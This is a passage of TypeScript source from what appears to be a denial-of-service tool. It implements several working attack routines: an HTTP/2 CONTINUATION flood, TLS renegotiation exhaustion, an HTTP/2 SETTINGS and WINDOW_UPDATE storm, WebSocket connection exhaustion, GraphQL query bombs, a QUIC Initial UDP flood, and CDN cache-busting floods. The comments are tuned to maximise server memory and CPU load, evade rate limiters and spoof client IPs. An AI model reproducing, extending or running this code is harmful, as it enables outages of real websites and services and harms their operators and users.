    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  // Client preface (RFC 7540 §3.5)
  const PREFACE    = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SETTINGS   = mkFrame(0x04, 0x00, 0, Buffer.alloc(0)); // empty SETTINGS
  const SACK       = mkFrame(0x04, 0x01, 0, Buffer.alloc(0)); // SETTINGS ACK

  // Minimal HPACK-encoded request headers (no Huffman for simplicity)
  const makeHpack = (host: string): Buffer => {
    const h = Buffer.from(host);
    return Buffer.concat([
      Buffer.from([0x82, 0x84, 0x87]),   // :method GET, :path /, :scheme https (indexed)
      Buffer.from([0x41, h.length]), h,   // :authority literal with incremental indexing
    ]);
  };

  // CONTINUATION payload — fills each frame with 8–16 KB of garbage header data.
  // HTTP/2 spec (RFC 7540 §6.10) mandates the server buffer ALL CONTINUATION frames
  // for a stream before delivering to the app layer. Max frame size is 16384 bytes.
  // Increasing from 128-512B → 8192-16384B = 32× more RAM allocated per stream.
  // Server cannot reject mid-stream — it must buffer until END_HEADERS or connection reset.
  const makeCont = (streamId: number): Buffer => {
    const payload = Buffer.allocUnsafe(randInt(8192, 16384)); // was 128-512 — now max allowed
    for (let i = 0; i < payload.length; i += 4)
      payload.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i); // random data, faster than byte loop
    return mkFrame(0x09, 0x00, streamId, payload); // type 0x09 = CONTINUATION, flags=0 (no END_HEADERS)
  };

  const IS_DEV    = process.env.NODE_ENV !== "production";
  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 1000); // 32GB: 1K slots × 150KB = 150MB

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const sock = tls.connect({
      host: resolvedHost, port: targetPort,
      servername: hostname, rejectUnauthorized: false,
      ALPNProtocols: ["h2"],
    });
    sock.setTimeout(30_000);

    let settled = false;
    const done = () => { if (!settled) { settled = true; resolve(); } };

    // Backpressure-aware write: if kernel buffer is full, wait for drain
    // before continuing — prevents unbounded buffer growth (OOM / silent drop)
    const safeWrite = (buf: Buffer): Promise<void> => {
      if (sock.destroyed) return Promise.resolve();
      const ok = sock.write(buf);
      if (ok) return Promise.resolve();
      return new Promise<void>(r => {
        if (sock.destroyed) { r(); return; }
        sock.once("drain", r);
      });
    };

    sock.once("secureConnect", () => {
      sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
      localPkts++; localBytes += PREFACE.length + 18;

      let streamId = 1;

      // Async attack loop: burst CONTINUATION frames per stream, then yield
      // Burst 50–300 × 8–16KB = 400KB–4.8MB per cycle — massive RAM pressure on server
      // while remaining within socket write-buffer bounds (checked via drain).
      const attack = async (): Promise<void> => {
        while (!signal.aborted && !sock.destroyed) {
          // HEADERS frame: END_STREAM=1 but NO END_HEADERS → forces server to buffer CONTINUATION
          const hpack = makeHpack(hostname);
          await safeWrite(mkFrame(0x01, 0x01, streamId, hpack));
          localPkts++; localBytes += 9 + hpack.length;

          // Flood CONTINUATION frames — each frame forces server to reallocate its HPACK state
          // keeping frame sizes large (8–16KB) to maximise per-stream memory on target
          const burst = randInt(50, 300);
          for (let i = 0; i < burst && !sock.destroyed; i++) {
            const cf = makeCont(streamId);
            await safeWrite(cf);
            localPkts++; localBytes += cf.length;
          }

          // RFC 7540 §5.1.1: stream IDs are monotonically increasing, never reuse on same conn
          if (streamId > 0x7FFFFF00) { sock.destroy(); done(); return; }
          streamId += 2; // client uses odd stream IDs

          // Yield to event loop between bursts so flush/drain events can fire
          await new Promise<void>(r => setImmediate(r));
        }
        done();
      };
      attack().catch(() => done());
    });

    sock.on("data",    () => {}); // drain server GOAWAY / SETTINGS frames
    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
  });

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  TLS RENEGOTIATION DoS
//
//  Forces the server to perform a full TLS handshake repeatedly while the
//  connection is alive. Each renegotiation requires a full asymmetric-key
//  operation (~3ms on modern HW) — with 200 slots each renegotiating every
//  200ms = 3,000 handshakes/sec = ~9ms of CPU per core continuously.
//
//  Only works against TLS 1.2 — TLS 1.3 removed renegotiation.
//  Most CDN origins still offer TLS 1.2 via fallback.
// ─────────────────────────────────────────────────────────────────────────
async function runTLSRenego(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const IS_DEV    = process.env.NODE_ENV !== "production";
  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 800); // 32GB: 800 RSA slots; 8vCPU handles 800 × 10 renegotiations/sec

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    // ★ RSA cipher priority: prioritize cipher suites WITHOUT forward secrecy (ECDHE/DHE prefix).
    // Non-FS ciphers (AES256-GCM-SHA384, AES128-GCM-SHA256, etc.) use RSA key exchange.
    // TLS 1.2 RSA handshake: server must decrypt ClientKeyExchange with its RSA private key (~1ms
    // asymmetric op). ECDHE handshake: server does fast ECC multiply instead (~0.1ms). RSA is ~10×
    // more expensive — prioritizing these ciphers multiplies server CPU cost per renegotiation.
    // Non-FS first, then ECDHE fallback so we still connect if RSA-only is unsupported.
    const RSA_PRIORITY_CIPHERS = [
      "AES256-GCM-SHA384",          // RSA key exchange, no FS — most expensive per handshake
      "AES128-GCM-SHA256",          // RSA key exchange, no FS
      "AES256-SHA256",              // RSA key exchange, CBC mode
      "AES128-SHA256",              // RSA key exchange, CBC mode
      "AES256-SHA",                 // RSA key exchange, older CBC
      "AES128-SHA",                 // RSA key exchange, older CBC
      "ECDHE-RSA-AES256-GCM-SHA384",// ECDHE fallback (server may reject non-FS first)
      "ECDHE-RSA-AES128-GCM-SHA256",// ECDHE fallback
    ].join(":");

    const sock = tls.connect({
      host: resolvedHost, port: targetPort,
      servername: hostname, rejectUnauthorized: false,
      maxVersion: "TLSv1.2" as tls.SecureVersion, // force TLS 1.2 — renegotiation requires it
      ciphers: RSA_PRIORITY_CIPHERS,
    });
    sock.setTimeout(60_000);

    let settled = false;
    const done = () => { if (!settled) { settled = true; resolve(); } };

    const doRenego = () => {
      if (signal.aborted || sock.destroyed) { done(); return; }
      try {
        sock.renegotiate({ rejectUnauthorized: false }, (err) => {
          if (err || signal.aborted) { try { sock.destroy(); } catch { /**/ } done(); return; }
          localPkts++; localBytes += 2800; // ~2.8KB RSA TLS handshake (larger than ECDHE)
          // ★ Randomized 50–150ms interval (was fixed 200ms) → 7–20 renegotiations/sec per slot
          // Random timing also defeats per-second rate limiters that expect fixed intervals.
          setTimeout(doRenego, randInt(50, 150));
        });
      } catch { done(); }
    };

    sock.once("secureConnect", () => {
      // Initial keepalive request so server doesn't close idle connection
      sock.write(`HEAD / HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n\r\n`);
      localPkts++; localBytes += 60;
      setTimeout(doRenego, 100); // start renegotiation sooner (was 300ms)
    });

    sock.on("data",    () => {});
    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 200); });
    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 300); });
    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 150); });
    signal.addEventListener("abort", () => { try { sock.destroy(); } catch { /**/ } done(); }, { once: true });
  });

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  H2 SETTINGS STORM
//
//  Attack in 3 simultaneous layers on each H2 connection:
//
//  Layer 1 — SETTINGS_HEADER_TABLE_SIZE storm:
//    Rapidly alternate HPACK table size 0 ↔ 65536. RFC 7541 §4.2: when size
//    decreases, the server MUST evict dynamic table entries until the table fits.
//    HPACK table size = 0 → server clears entire dynamic table.
//    HPACK table size = 65536 → server re-enables full 64KB table.
//    Each change triggers mandatory table eviction + state bookkeeping.
//    At 100+ changes/sec, server is locked in constant alloc/clear/alloc cycles.
//
//  Layer 2 — Half-open stream accumulation:
//    Open OPEN_STREAMS half-open streams (HEADERS without END_STREAM).
//    Server allocates state for each (goroutine / worker slot / connection context).
//    These streams block server resources while the SETTINGS storm runs.
//
//  Layer 3 — WINDOW_UPDATE flood on every open stream:
//    Repeatedly send WINDOW_UPDATE frames on all open streams + connection.
//    Server must process each to update its send flow-control state per stream.
//    RFC 7540 §6.9: each WINDOW_UPDATE triggers per-stream recalculation.
//
//  DEV: 60 slots | PROD: 400 slots
// ─────────────────────────────────────────────────────────────────────────
async function runH2SettingsStorm(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const IS_DEV    = process.env.NODE_ENV !== "production";
  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 800); // 32GB: 800 × 100KB = 80MB
  const OPEN_STREAMS = IS_DEV ? 20 : 100; // PROD: 100 half-open streams × 800 slots = 80K pending streams

  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SACK    = mkFrame(0x04, 0x01, 0, Buffer.alloc(0)); // SETTINGS ACK

  // SETTINGS frame with single SETTINGS_HEADER_TABLE_SIZE (id=0x0001) param
  const mkSettingsHTS = (tableSize: number): Buffer => {
    const p = Buffer.allocUnsafe(6);
    p.writeUInt16BE(0x0001, 0); // SETTINGS_HEADER_TABLE_SIZE
    p.writeUInt32BE(tableSize, 2);
    return mkFrame(0x04, 0x00, 0, p);
  };

  const SETTINGS_CLEAR = mkSettingsHTS(0);     // clears HPACK dynamic table entirely
  const SETTINGS_FULL  = mkSettingsHTS(65536); // restores 64KB HPACK table

  // WINDOW_UPDATE frame: stream 0 (connection) or stream N
  const mkWU = (streamId: number, increment: number): Buffer => {
    const p = Buffer.allocUnsafe(4);
    p.writeUInt32BE(increment & 0x7fffffff, 0);
    return mkFrame(0x08, 0x00, streamId, p);
  };

  // HEADERS frame WITHOUT END_STREAM — opens a stream that server must keep alive
  const mkOpenHeaders = (sid: number): Buffer => {
    const hBuf = Buffer.from(hostname);
    const hpack = Buffer.concat([
      Buffer.from([0x82, 0x84, 0x87]),     // :method GET, :path /, :scheme https (indexed)
      Buffer.from([0x41, hBuf.length]), hBuf, // :authority literal incremental-index
    ]);
    return mkFrame(0x01, 0x04, sid, hpack); // 0x04 = END_HEADERS only (no END_STREAM)
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const sock = tls.connect({
      host: resolvedHost, port: targetPort,
      servername: hostname, rejectUnauthorized: false,
      ALPNProtocols: ["h2"],
      ciphers: randomJA3Ciphers(),
    });
    sock.setTimeout(30_000);
    let settled = false;
    const done  = () => { if (!settled) { settled = true; resolve(); } };

    sock.once("secureConnect", () => {
      // Send client preface + initial SETTINGS (full table) + ACK
      sock.write(Buffer.concat([PREFACE, SETTINGS_FULL, SACK]));
      localPkts++; localBytes += PREFACE.length + SETTINGS_FULL.length + SACK.length;

      // Open OPEN_STREAMS half-open streams (no END_STREAM → server holds them open)
      let topStreamId = 1;
      for (let i = 0; i < OPEN_STREAMS; i++) {
        const f = mkOpenHeaders(topStreamId);
        sock.write(f);
        localPkts++; localBytes += f.length;
        topStreamId += 2;
      }

      // Also expand connection-level window to max so server can send data
      const connWU = mkWU(0, 0x3fffffff);
      sock.write(connWU);
      localPkts++; localBytes += 13;

      // Storm loop — run as fast as the event loop allows
      let toggle = false;
      const storm = () => {
        if (signal.aborted || sock.destroyed) { done(); return; }

        // Layer 1: alternate SETTINGS_HEADER_TABLE_SIZE (clear ↔ full)
        // Each change forces server to evict/restore entire HPACK dynamic table
        const settings = toggle ? SETTINGS_CLEAR : SETTINGS_FULL;
        toggle = !toggle;
        sock.write(settings);
        localPkts++; localBytes += settings.length;

        // Layer 3: WINDOW_UPDATE on every open stream + connection
        // Moderate increment (8192) to stay well below the 2^31-1 overflow boundary
        for (let sid = 1; sid < topStreamId; sid += 2) {
          const wu = mkWU(sid, 8192);
          sock.write(wu);
          localPkts++; localBytes += 13;
        }
        const cWU = mkWU(0, 8192);
        sock.write(cWU);
        localPkts++; localBytes += 13;

        setImmediate(storm);
      };
      storm();
    });

    sock.on("data",    () => {}); // drain server SETTINGS ACKs + RST_STREAMs
    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
  });

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  WEBSOCKET EXHAUSTION
//
//  Opens thousands of WebSocket connections and holds them open with periodic
//  pings (every 20s). Servers allocate a goroutine/thread/fiber per WS
//  connection — far more expensive than HTTP since WS is stateful.
//  nginx: reserves a keepalive_requests slot + worker_connection slot per WS.
//  Node.js targets: allocates an EventEmitter + parser per ws socket.
//
//  DEV cap: 400 sockets | PROD: 5,000 sockets
// ─────────────────────────────────────────────────────────────────────────
async function runWSFlood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  const IS_DEV    = process.env.NODE_ENV !== "production";
  const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 30, 20000); // 32GB: 20K WS × 40KB = 800MB
  const useHttps  = targetPort === 443;

  const WS_PATHS  = ["/ws", "/websocket", "/socket", "/socket.io/", "/live", "/chat",
                     "/stream", "/events", "/push", "/realtime", "/notify", "/feed", "/"];
  // WebSocket ping frame: FIN=1, opcode=0x9 (ping), no mask, length=0
  const PING_FRAME = Buffer.from([0x89, 0x00]);

  let localPkts = 0, localBytes = 0, activeConns = 0;
  const flush   = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const wsKey = () => Buffer.from(Array.from({ length: 16 }, () => randInt(0, 256))).toString("base64");

  const runSock = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const path   = WS_PATHS[randInt(0, WS_PATHS.length)];
    const key    = wsKey();
    const req = [
      `GET ${path} HTTP/1.1`,
      `Host: ${hostname}`,
      `Upgrade: websocket`,
      `Connection: Upgrade`,
      `Sec-WebSocket-Key: ${key}`,
      `Sec-WebSocket-Version: 13`,
      `Origin: https://${hostname}`,
      `User-Agent: ${randUA()}`,
      `Cache-Control: no-cache`,
      `X-Forwarded-For: ${randIp()}`,
      ``, ``,
    ].join("\r\n");

    const sock: net.Socket = useHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.createConnection({ host: resolvedHost, port: targetPort });

    sock.setTimeout(130_000);

    let upgraded = false, settled = false, pingIv: NodeJS.Timeout | null = null;
    let respBuf  = "";
    const done = () => {
      if (!settled) {
        settled = true;
        if (upgraded) activeConns = Math.max(0, activeConns - 1);
        if (pingIv) { clearInterval(pingIv); pingIv = null; }
        resolve();
      }
    };

    const onConnect = () => {
      sock.write(req);
      localPkts++; localBytes += req.length;
    };
    if (useHttps) (sock as tls.TLSSocket).once("secureConnect", onConnect);
    else sock.once("connect", onConnect);

    sock.on("data", (data: Buffer) => {
      if (!upgraded) {
        respBuf += data.toString("ascii");
        if (respBuf.includes("101")) {
          upgraded = true; activeConns++;
          localPkts++; localBytes += 200;
          // Ping every 20s to keep the server's WS goroutine alive
          pingIv = setInterval(() => {
            if (signal.aborted || !upgraded) { done(); sock.destroy(); return; }
            try {
              // Alternate: PING frames + large binary frames (TEXT opcode 0x81)
              // Large frames force server to parse frame header, allocate read buffer,
              // process the message — 5–64 KB per write × hundreds of conns = RAM + CPU exhaustion
              if (Math.random() < 0.35) {
                const frameSize = randInt(4096, 65535);
                const frameHdr  = frameSize < 126
                  ? Buffer.from([0x82, frameSize])           // FIN + binary, 1-byte len
                  : Buffer.from([0x82, 126,
                      (frameSize >> 8) & 0xff,
                       frameSize       & 0xff,               // 2-byte extended len
                    ]);
                const payload = Buffer.allocUnsafe(frameSize);
                // Fill with random bytes — prevents server compression shortcuts
                for (let i = 0; i < frameSize; i += 4)
                  payload.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i);
                sock.write(Buffer.concat([frameHdr, payload]));
                localPkts++; localBytes += frameHdr.length + frameSize;
              } else {
                sock.write(PING_FRAME); localPkts++; localBytes += 2;
              }
            }
            catch { done(); }
          }, 8_000);
        } else if (respBuf.length > 8192) {
          // Not a WS path — reconnect to different path
          sock.destroy(); done();
          if (!signal.aborted) setTimeout(() => runSock().then(resolve), 20);
          return;
        }
      }
    });

    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSock().then(resolve),  50); });
    sock.on("error",   () => { done();          if (!signal.aborted) setTimeout(() => runSock().then(resolve), 100); });
    sock.on("close",   () => { done();          if (!signal.aborted) setTimeout(() => runSock().then(resolve),  50); });
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
  });

  await Promise.all(Array.from({ length: MAX_CONNS }, () => runSock()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  GRAPHQL INTROSPECTION DoS
//
//  Sends deeply nested GraphQL queries that cause exponential resolver CPU.
//  A 15-level nested query with aliases can multiply O(1) resolvers into O(N^15).
//  Also sends batched introspection queries (__schema traversal is expensive).
//
//  Targets: /graphql, /api/graphql, /api/v1/graphql, /query, /gql, etc.
//  Works best against unprotected GraphQL APIs (no query depth limit or cost limit).
// ─────────────────────────────────────────────────────────────────────────
async function runGraphQLDoS(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const ENDPOINTS = [
    "/graphql", "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
    "/graphql/v1", "/query", "/api/query", "/gql", "/v1/graphql",
    "/admin/graphql", "/graphql/playground", "/api/v3/graphql",
  ];

  // Build deeply nested query — exponential resolver complexity
  const TYPES  = ["user", "post", "comment", "author", "likes", "followers", "following", "product", "order"];
  const FIELDS = ["id", "name", "email", "title", "body", "content", "createdAt", "updatedAt", "slug"];
  const buildNested = (depth = randInt(8, 16)): string => {
    let q = "{ ", close = "";
    for (let i = 0; i < depth; i++) {
      const t = TYPES[randInt(0, TYPES.length)];
      const f = FIELDS[randInt(0, FIELDS.length)];
      q     += `${t}(id: ${randInt(1, 999999)}) { ${f} `;
      close += " }";
    }
    return q + close + " }";
  };

  // Introspection: forces full schema traversal (expensive type resolution)
  const INTROSPECTION = `{ __schema { types { name description fields { name description type {
    name kind ofType { name kind ofType { name kind ofType { name kind } } } }
    args { name description type { name kind } } } }
    directives { name description locations } } }`;

  // Alias bombing: many aliases for the same expensive field in one request
  const buildAliasBomb = (count = randInt(30, 100)): string => {
    const t = TYPES[randInt(0, TYPES.length)];
    const aliases = Array.from({ length: count },
      (_, i) => `a${i}: ${t}(id: ${randInt(1, 999999)}) { id name }`
    ).join(" ");
    return `{ ${aliases} }`;
  };

  // Fragment bomb: deeply-branching non-circular fragment definitions
  // Forces the server to resolve each fragment against the schema (expensive type checking),
  // build a merged selection set, and execute all fields — O(fragments × fields) per request.
  const buildFragmentBomb = (fragCount = randInt(20, 60)): string => {
    const frags: string[] = [];
    for (let i = 0; i < fragCount; i++) {
      const t = TYPES[randInt(0, TYPES.length)];
      // Each fragment spreads multiple fields — creates a wide selection set
      const fields = Array.from({ length: randInt(3, 10) },
        () => FIELDS[randInt(0, FIELDS.length)]
      ).join(" ");
      // Spread the previous fragment (if any) to chain them — forces recursive resolution
      const spread = i > 0 && Math.random() < 0.7 ? `...frag${i - 1}` : "";
      frags.push(`fragment frag${i} on ${t.charAt(0).toUpperCase() + t.slice(1)} { ${fields} ${spread} }`);
    }
    const t = TYPES[randInt(0, TYPES.length)];
    // Query uses all fragments in aliases — maximises resolver calls
    const aliases = frags.map((_, i) =>
      `a${i}: ${t}(id: ${randInt(1, 9999)}) { ...frag${i} }`
    ).join(" ");
    return frags.join("\n") + `\nquery Q { ${aliases} }`;
  };

  // Batched array of queries (many operations in one HTTP request)
  const buildBatch = (size = randInt(5, 25)): string => {
    const ops = Array.from({ length: size }, () => {
      const r = Math.random();
      const q = r < 0.25 ? buildAliasBomb()
              : r < 0.5  ? buildFragmentBomb()
              : buildNested();
      return { query: q, variables: {} };
    });
    return JSON.stringify(ops);
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const baseUrl = /^https?:\/\//i.test(base) ? base.replace(/\/$/, "") : `https://${base}`;

  const runThread = async (): Promise<void> => {
    while (!signal.aborted) {
      try {
        const endpoint = ENDPOINTS[randInt(0, ENDPOINTS.length)];
        const url      = baseUrl + endpoint;

        const r        = Math.random();
        const isIntro  = r < 0.15;
        const isFrag   = r < 0.35;
        const isBatch  = r < 0.60;
        const body     = isIntro
          ? JSON.stringify({ query: INTROSPECTION })
          : isFrag  ? JSON.stringify({ query: buildFragmentBomb() })
          : isBatch ? buildBatch()
          : JSON.stringify({ query: buildNested(), variables: { id: randInt(1, 999999) } });

        const ctrl  = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), 12_000);
        try {
          await fetch(url, {
            method:  "POST",
            signal:  ctrl.signal,
            headers: {
              "Content-Type":   "application/json",
              "User-Agent":     randUA(),
              "X-Forwarded-For": randIp(),
              "Accept":         "application/json",
              "Cache-Control":  "no-cache",
              "X-Request-ID":   randHex(16),
            },
            body,
          });
          clearTimeout(timer);
          localPkts++; localBytes += body.length + 200;
        } catch { clearTimeout(timer); }
      } catch { /* swallow */ }
      // Tiny yield to avoid monopolising the event loop
      if (Math.random() < 0.05) await new Promise(r => setTimeout(r, 5));
    }
  };

  await Promise.all(Array.from({ length: Math.min(threads, 800) }, () => runThread())); // 32GB: 800 concurrent fragment bombs
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  QUIC / HTTP3 FLOOD
//
//  Sends UDP packets with QUIC Long Header + CRYPTO frame (RFC 9000).
//  Each packet looks like a QUIC Initial — server allocates state per
//  unique DCID, consumes CPU for header protection + decryption attempt.
//  Targets port 443/UDP on HTTP/3-capable servers. Falls back to raw UDP
//  flood for non-QUIC targets. Random DCIDs prevent dedup.
// ─────────────────────────────────────────────────────────────────────────
async function runQUICFlood(
  resolvedHost: string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const IS_DEV    = process.env.NODE_ENV !== "production";
  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);   // 32GB: 64 UDP sockets
  const INFLIGHT  = IS_DEV ? 200 : 2000; // 32GB: 2K inflight QUIC initials per socket
  const PKTSIZE   = 1200; // QUIC minimum MTU

  const makeQUICInitial = (): Buffer => {
    const dcidLen = 8 + (Math.random() * 12 | 0);
    const scidLen = 8;
    const dcid = Buffer.allocUnsafe(dcidLen);
    const scid = Buffer.allocUnsafe(scidLen);
    for (let i = 0; i < dcidLen; i++) dcid[i] = Math.random() * 256 | 0;
    for (let i = 0; i < scidLen; i++) scid[i] = Math.random() * 256 | 0;
    const hdr = Buffer.allocUnsafe(7 + dcidLen + scidLen);
    let off = 0;
    hdr[off++] = 0xC0 | (Math.random() * 4 | 0);  // Long Header | Initial
    hdr.writeUInt32BE(0x00000001, off); off += 4;   // QUIC v1
    hdr[off++] = dcidLen;
    dcid.copy(hdr, off); off += dcidLen;
    hdr[off++] = scidLen;
    scid.copy(hdr, off);
    // CRYPTO frame payload (fake ClientHello bytes)
    const payload = Buffer.allocUnsafe(Math.max(0, PKTSIZE - hdr.length - 6));
    payload[0] = 0x06; // CRYPTO frame type
    payload[1] = 0x00; payload[2] = 0x00; // offset = 0
    payload.writeUInt16BE(payload.length - 4, 3); // length field
    for (let i = 4; i < payload.length; i++) payload[i] = Math.random() * 256 | 0;
    return Buffer.concat([hdr, Buffer.from([0x00, 0x01]), payload]); // pkt num + payload
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const pending: Promise<void>[] = [];
  for (let i = 0; i < NUM_SOCKS; i++) {
    const s = dgram.createSocket("udp4");
    pending.push(new Promise<void>(resolve => {
      if (signal.aborted) { resolve(); return; }
      let inflight = 0;
      const send = () => {
        if (signal.aborted) { if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); } return; }
        while (inflight < INFLIGHT) {
          inflight++;
          const pkt = makeQUICInitial();
          s.send(pkt, 0, pkt.length, targetPort, resolvedHost, (err) => {
            inflight--;
            if (!err) { localPkts++; localBytes += pkt.length; }
            if (!signal.aborted) setImmediate(send);
            else if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
          });
        }
      };
      s.on("error", () => { resolve(); });
      send();
      signal.addEventListener("abort", () => {
        if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
      }, { once: true });
    }));
  }

  await Promise.all(pending);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  CACHE POISONING DoS
//
//  Poisons CDN/reverse-proxy cache with requests that generate unique
//  cache keys → evicts legitimate content, forces origin miss rate to 100%.
//  Techniques:
//    1. Random bust params → each request = new cache entry
//    2. X-Forwarded-Host / X-Original-URL → host-keyed cache pollution
//    3. Range: bytes=N-M → partial-content fragments fill object store
//    4. Fake CF-Connecting-IP → IP-keyed cache segmentation
//    5. Vary-intensive headers → multiplies entries per resource URL
//  Effective against: Cloudflare, Fastly, Akamai, Varnish, Nginx proxy_cache
// ─────────────────────────────────────────────────────────────────────────
async function runCachePoison(
  base:    string,
  threads: number,
  signal:  AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const IS_DEV    = process.env.NODE_ENV !== "production";
  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1500 CDN-busting slots

  const rand    = (n: number) => Math.random() * n | 0;
  const rHex    = (n: number) => Array.from({ length: n }, () => (rand(16)).toString(16)).join("");
  const rIP     = () => `${rand(256)}.${rand(256)}.${rand(256)}.${rand(256)}`;
  const rBytes  = () => `bytes=${rand(10000)}-${rand(10000) + rand(1000)}`;

  const POISONS: Array<() => Record<string, string>> = [
    () => ({ "X-Forwarded-Host": `${rHex(8)}.evil.null`, "X-Host": `${rHex(6)}.cdn.void` }),
    () => ({ "X-Original-URL": `/${rHex(4)}/admin/${rHex(6)}`, "X-Rewrite-URL": `/secret/${rHex(4)}` }),
    () => ({ "Accept-Encoding": ["br", "zstd", "identity", "gzip, br"][rand(4)] }),
    () => ({ "Range": rBytes(), "If-Range": new Date(Date.now() - rand(86400000)).toUTCString() }),
    () => ({ "Cookie": `buster=${rHex(16)}; sid=${rHex(32)}; track=${rHex(8)}` }),
    () => ({ "CF-Connecting-IP": rIP(), "True-Client-IP": rIP(), "X-Real-IP": rIP() }),
    () => ({ "Pragma": "no-cache", "Cache-Control": "no-store", "Vary": "User-Agent,Accept-Encoding,Cookie,CF-Connecting-IP,Origin" }),
    () => ({ "Origin": `https://${rHex(6)}.evil.null`, "Referer": `https://${rHex(6)}.attacker.null/ref` }),
  ];
  const PATHS = ["/", "/?v=", "/?_=", "/?cache=", "/?r=", "/?id=", "/?t=", "/?bust=", "/?debug=", "/?ref=", "/?ts=", "/?q="];

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }
    const loop = async () => {
      while (!signal.aborted) {
        const poison = POISONS[rand(POISONS.length)]();
